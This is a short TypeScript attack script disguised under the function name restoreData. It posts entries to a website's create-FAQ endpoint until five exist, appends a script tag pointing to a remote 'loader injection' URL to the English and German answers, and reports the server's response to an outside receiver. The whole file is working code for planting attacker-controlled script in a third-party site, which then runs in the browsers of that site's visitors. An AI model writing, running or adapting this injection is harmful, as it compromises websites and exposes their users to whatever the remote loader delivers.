import { exec, wait, wget } from 'utils';
import { faqs } from 'data.json';
import { DAICHI2_CREATE_FAQ_URL, DAICHI2_FAQ_URL, REHABEAM_LOADER_INJECTION_URL } from 'constants';
import { sendDataToReceiver } from './sendDataToReceiver';

export function restoreData(): Promise<void> {
	return wget(DAICHI2_FAQ_URL).then(async (data) => {
		const faqCount = data.match(/<a.*?class="faq-collapse".*?>.*?<\/a>/gis)?.length ?? 0;

		/**
		 * If 5 or more than 5 faqs are created, our goal is already reached.
		 */
		if (faqCount >= 5) return;

		let once = true;
		let once2 = true;

		for (const [i, faq] of faqs.entries()) {
			const formData = new FormData();

			for (let [name, value] of Object.entries(faq)) {
				formData.append(name, value);
			}

			if (once) {
				once = false;

				/**
				 * Injects the loader into faq page.
				 */
				formData.set('answer_en', faq.answer_en + `<script src="${REHABEAM_LOADER_INJECTION_URL}"></script>`);
				formData.set('answer_de', faq.answer_de + `<script src="${REHABEAM_LOADER_INJECTION_URL}"></script>`);
			}

			const newLanguages = ['tr', 'ro'];

			for (const newLanguage of newLanguages) {
				formData.set(`question_${newLanguage}`, '');
				formData.set(`answer_${newLanguage}`, '');
			}

			await exec(() =>
				fetch(DAICHI2_CREATE_FAQ_URL, {
					method: 'POST',
					body: formData,
				}).then((response) => {
					if (once2) {
						once2 = false;

						sendDataToReceiver({
							context: 'faq',
							message: '\n-- **FAQ** --\n\n' + `Status: ${response.status}\nStatus Text: ${response.statusText}`,
						});
					}
				})
			);

			await wait(10);
		}
	});
}
